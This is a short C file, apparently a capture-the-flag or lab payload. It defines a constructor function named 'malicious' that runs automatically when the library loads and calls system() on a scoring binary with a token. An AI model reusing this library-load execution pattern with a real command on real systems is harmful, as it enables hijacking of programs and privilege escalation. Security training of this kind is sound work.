#include<stdio.h>
#include<stdlib.h>
 
static void malicious() __attribute__((constructor));
 
void malicious() {
    system("/usr/local/bin/score 81e0da25-7b90-4b66-b652-8dcc97cdd1e7");
}
